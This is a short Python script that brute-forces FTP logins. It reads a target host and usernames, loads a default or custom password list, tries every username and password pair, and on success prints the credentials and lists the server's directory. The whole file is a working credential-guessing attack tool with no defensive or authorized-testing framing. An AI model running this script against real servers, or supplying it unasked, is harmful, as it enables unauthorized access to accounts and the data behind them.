from ftplib import FTP
import os

try:
    with open("host.txt", "r") as f:
        host = f.readline().strip()
except:
    host = input("Enter FTP host: ")

try:
    with open("usernames.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
except:
    usernames = [input("Enter username: ")]

print("\n[?] Password list options:")
print("1) Use default (passwords.txt)")
print("2) Use custom passlist")

choice = input("Select option (1/2): ")

if choice == "1":
    pass_file = "passwords.txt"
elif choice == "2":
    pass_file = input("Enter path to your passlist: ")
else:
    print("[!] Invalid choice.")
    exit()

if not os.path.exists(pass_file):
    print("[!] Password file not found!")
    exit()

with open(pass_file, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"\n[*] Target: {host}")
print(f"[*] Using passlist: {pass_file}")
print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords\n")

for username in usernames:
    for password in passwords:
        try:
            ftp = FTP(host, timeout=5)
            ftp.login(user=username, passwd=password)

            print(f"[+] SUCCESS: {username}:{password}")
            print("[*] Directory listing:\n")

            ftp.retrlines("LIST")

            ftp.quit()
            exit()

        except:
            print(f"[-] FAIL: {username}:{password}")

print("\n[!] No valid credentials found.")
